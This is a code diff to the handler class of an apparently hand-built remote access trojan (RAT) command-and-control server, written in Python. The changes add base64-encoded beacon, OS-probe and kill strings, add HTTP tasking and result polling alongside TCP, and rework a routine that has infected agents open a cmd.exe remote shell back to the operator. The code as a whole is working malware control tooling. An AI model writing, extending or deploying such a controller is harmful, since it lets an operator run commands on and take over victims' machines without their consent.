@@ -12,6 +12,9 @@ import base64
 import json
 import requests
 
+import json
+import requests
+
 class Handler(threading.Thread):
 
     def __init__(self, agent_id, loggers, transport_type, client=None, client_address=None):
@@ -38,6 +41,19 @@ class Handler(threading.Thread):
 
         self.status = ["UP","UP"]                       # <--UP - DOWN - ERR 
                                                         # [0] = PING, [1] = BEACON
+
+        # strings used for important communication
+        self.beacon_probe = "d2hhdCBhIGdyZWF0IGRheSB0byBzbWVsbCBmZWFy"
+        self.beacon_reply = "reply code"
+        self.os_win_probe = "UHJvYmluZyBPcGVyYXRpbmcgU3lzdGVt"
+        self.os_win_reply = ""
+        self.os_nix_probe = ""
+        self.os_nix_reply = ""
+        self.kill_probe = ""
+        self.kill_reply = ""
+        self.exit_probe = "c2xlZXBpbmc"
+        self.exit_reply = "c2xlZXBpbmc"
+
 
     # HTTP helper functions
     def api_get_request(self, endpoint):
@@ -70,7 +86,13 @@ class Handler(threading.Thread):
 
         # Beacon indefinitely??
         self.beacon()
-                                
+
+
+#------------------------------------------------------------------------------------------------------------------------------
+#          | GETTERS AND SETTERS |
+#------------------------------------------------------------------------------------------------------------------------------
+
+        
     def setStatus(self, index0, index1):
         self.status[0] = index0
         self.status[1] = index1
@@ -102,19 +124,30 @@ class Handler(threading.Thread):
     def getPort(self):
         return self.port
 
+    def getTT(self):
+        return self.transport_type
+
 #------------------------------------------------------------------------------------------------------------------------------
 
     def kill(self):     # hah
+        return_code = ''
         print(f"\n[*BotHandler-Msg] Severing connection for agent {str(self.agent_id)}...")
 
         # Log
         self.loggers[0].q_log('serv','info','[* BotHandler-Msg] Killing connection for agent '+str(self.agent_id))
         self.loggers[0].q_log('conn','info','[* BotHandler-Msg] Killing connection for agent '+str(self.agent_id))
 
-        self.execute("kill")
+        return_val = self.execute("kill")
+
+        if "ZGVhZA" in return_val:
+            return_code = True
+        else:
+            return_code = False
 
         self.loggers[0].q_log('serv','info','[* BotHandler-Msg] Sent "kill" command to agent '+str(self.agent_id))
-        self.loggers[0].q_log('conn','info','[* BotHandler-Msg] Sent "kill" command to agent '+str(self.agent_id))        
+        self.loggers[0].q_log('conn','info','[* BotHandler-Msg] Sent "kill" command to agent '+str(self.agent_id))     
+
+        return return_code   
 
 #------------------------------------------------------------------------------------------------------------------------------
 
@@ -171,7 +204,8 @@ class Handler(threading.Thread):
                     while(time.time() < t_end and wfc):
                         results = self.api_get_request("/results")
                         for i in range(len(results)):
-                            if(results[i]["agent_id"] == self.agent_id):    #and results[i]["task_id"] == task_id and results[i][".success"] == "true"
+                            res_task_id = [key for key in results[i].keys()][2]
+                            if(results[i]["agent_id"] == self.agent_id) and res_task_id == task_id and results[i][res_task_id]["success"] == "true":
                                 wfc = False
                                 self.status[0] = "UP"
                             else:
@@ -181,10 +215,7 @@ class Handler(threading.Thread):
 
     def shell(self):
 
-        self.beacon_wait = True
-
         # Initiate shell
-
         try:
             self.execute("shell", True)             # Signals RAT to initiate cmd.exe process and forward fds to socket
         except Exception as ex:
@@ -194,7 +225,6 @@ class Handler(threading.Thread):
             print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
             self.loggers[0].q_log('conn','info','[* BotHandler-Msg:ShellExec] Error: '+str(ex))
 
-            self.beacon_wait = False
             return False                            # unsuccessful
         else:
 
@@ -233,8 +263,8 @@ class Handler(threading.Thread):
 
                     if(cmd_sent.casefold().strip(" ") == 'quit\n' or cmd_sent.casefold().strip(" ") == 'exit\n'):
                         print(f"[* BotHandler-Msg:ShellExec] Sending EXIT signal to Agent. Please wait...")
-                        self.loggers[0].q_log('serv','info','[* BotHandler-Msg:ShellExec] Sending EXIT signal to agent: '+str(agent_id))
-                        self.loggers[0].q_log('conn','info','[* BotHandler-Msg:ShellExec] Sending EXIT signal to agent: '+str(agent_id))
+                        self.loggers[0].q_log('serv','info','[* BotHandler-Msg:ShellExec] Sending EXIT signal to agent: '+str(self.agent_id))
+                        self.loggers[0].q_log('conn','info','[* BotHandler-Msg:ShellExec] Sending EXIT signal to agent: '+str(self.agent_id))
 
                         self.client.send(("exit\n").encode('utf-8'))
 
@@ -315,7 +345,6 @@ class Handler(threading.Thread):
         self.loggers[0].q_log('serv','info','[* BotHandler-Msg:ShellExec] Exiting Shell interaction with agent '+str(self.agent_id)+' at '+str(self.ip))
         self.loggers[0].q_log('conn','info','[* BotHandler-Msg:ShellExec] Exiting Shell interaction with agent '+str(self.agent_id)+' at '+str(self.ip))
 
-        self.beacon_wait = False
         return True
 #------------------------------------------------------------------------------------------------------------------------------
     def execute(self, cmd_sent, suppress=True):
@@ -330,7 +359,11 @@ class Handler(threading.Thread):
         # Single instance execution
         try:
             # Send data/command to RAT
-            self.client.send(cmd_sent.encode('utf-8'))
+            if self.transport_type == "TCP":
+                self.client.send(cmd_sent.encode('utf-8'))
+            elif self.transport_type == "HTTP":
+                request_payload = json.loads(cmd_sent)
+                task_obj = self.api_post_request("/tasks", request_payload)
         except Exception as ex:
             # Log this
             print(f"[* BotHandler-Msg:StdExec] Unable to send command to bot {self.agent_id} at {str(self.ip)}")
@@ -342,11 +375,31 @@ class Handler(threading.Thread):
             return "== Return Value Error =="
         else:
             cmd_response = ""
+            ex = False # Only true when http server has received exit response from agent
             while(True):
                 try:
-                    self.client.settimeout(3)
-                    recv = self.client.recv(4096).decode('utf-8')
-
+                    if self.transport_type == "TCP":
+                        self.client.settimeout(3)
+                        recv = self.client.recv(4096).decode('utf-8')
+                    elif self.transport_type == "HTTP":
+                        recv = ""
+                        request_payload = json.loads(cmd_sent)
+                        task_obj = self.api_post_request("/tasks", request_payload)
+                        task_id = task_obj[0]["task_id"]
+                        wfc = True # waiting for connection
+                        t_end = time.time() + 20
+                        while(time.time() < t_end and wfc):
+                            results = self.api_get_request("/results")
+                            for i in reversed(range(len(results))):
+                                res_task_id = [key for key in results[i].keys()][-1]
+                                if(not(res_task_id == "agent_id")):
+                                    print(f'received task_id: {res_task_id}')
+                                    print(f'received success token: {results[i][res_task_id]["success"]}')
+                                if(results[i]["agent_id"] == self.agent_id) and res_task_id == task_id and results[i][res_task_id]["success"] == "true":
+                                    wfc = False
+                                    recv = json.dumps(results[i])
+                                    break
+                        ex = True
                 except socket.timeout:
                     # if timeout exception is triggered - assume no more data
                     recv = ""
@@ -360,7 +413,7 @@ class Handler(threading.Thread):
 
                     break
 
-                if not recv:
+                if not recv or ex:
                     break
                 else:
                     cmd_response += recv
